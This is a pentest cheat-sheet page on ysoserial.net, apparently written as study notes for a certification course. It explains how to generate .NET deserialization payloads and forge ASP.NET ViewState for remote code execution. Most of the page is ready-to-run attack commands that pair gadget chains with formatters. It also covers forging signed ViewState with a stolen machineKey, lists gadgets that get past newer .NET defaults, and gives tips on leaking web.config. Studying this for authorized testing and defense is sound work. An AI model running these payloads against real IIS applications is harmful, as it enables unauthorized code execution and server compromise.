# ysoserial.net

**Tags:** #ysoserialnet #Deserialization #DotNet #ASPNET #ViewState #RCE #GadgetChains #Payloads

`ysoserial.net` generates deserialization payloads for .NET formatters — `BinaryFormatter`, `LosFormatter`, `ObjectStateFormatter`, `NetDataContractSerializer`, `JavaScriptSerializer`, `Json.Net`, `XmlSerializer`. Its highest-value use on engagements is forging ASP.NET `__VIEWSTATE` values: given a leaked `machineKey` (or an app with MAC validation disabled), you get direct RCE on the IIS worker process.

**Source:** https://github.com/pwntester/ysoserial.net
**Install:** grab `ysoserial.exe` from the releases page — runs natively on Windows, or via `mono ysoserial.exe` on Linux

```bash
# Enumerate gadgets and the formatters each supports
mono ysoserial.exe -l

# Generic gadget + formatter
mono ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c whoami"

# ViewState with a known machineKey (the usual path once web.config leaks)
mono ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  --generator=<__VIEWSTATEGENERATOR> \
  --validationkey=<HEX> --validationalg=SHA1 \
  -c "cmd /c ping -n 1 10.10.14.5"

# ViewState where MAC validation is disabled (legacy apps)
mono ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "cmd /c whoami > C:\inetpub\wwwroot\pwned.txt" -o base64

# Json.Net gadget — common in .NET APIs that deserialize with TypeNameHandling
mono ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd /c whoami"
```

| Flag | Description |
|---|---|
| `-g` | Gadget chain (`TypeConfuseDelegate`, `ObjectDataProvider`, `ActivitySurrogateSelector`, `TextFormattingRunProperties`) |
| `-f` | Formatter to target |
| `-p` | Plugin — `ViewState`, `DotNetNuke`, `Altserialization`, etc. (higher-level than `-f`) |
| `-c` | Command to execute |
| `-o` | Output format (`raw`, `base64`) |
| `--validationkey` / `--validationalg` | machineKey material for signing ViewState |

> [!tip] The `machineKey` is the whole game for ViewState. Hunt it via path traversal / LFI on `web.config`, XXE, or a `.svc`/`.asmx` info leak — see [[Class notes/HTB Academy/CPTS v2 (claude)/File Inclusion|File Inclusion]].

> [!warning] `ActivitySurrogateSelector` is disabled by default on .NET Framework 4.8+ (`AllowActivitySurrogateSelectorTypes` switch). Prefer `TextFormattingRunProperties` or `TypeConfuseDelegate` against modern targets.

> [!note] **See also** — [[Techniques/Deserialization|Deserialization]] — .NET gadget chains and ViewState forgery. Java equivalent is [[Tools/Payloads & Shells/ysoserial|ysoserial]]; PHP is [[Tools/Payloads & Shells/phpggc|phpggc]].
> Also used in [[Techniques/Non-PHP Web App Attacks|Non-PHP Web App Attacks]] (CPTS v2).

---

*Created: 2026-07-30*
*Updated: 2026-07-31*
*Model: claude-opus-5*
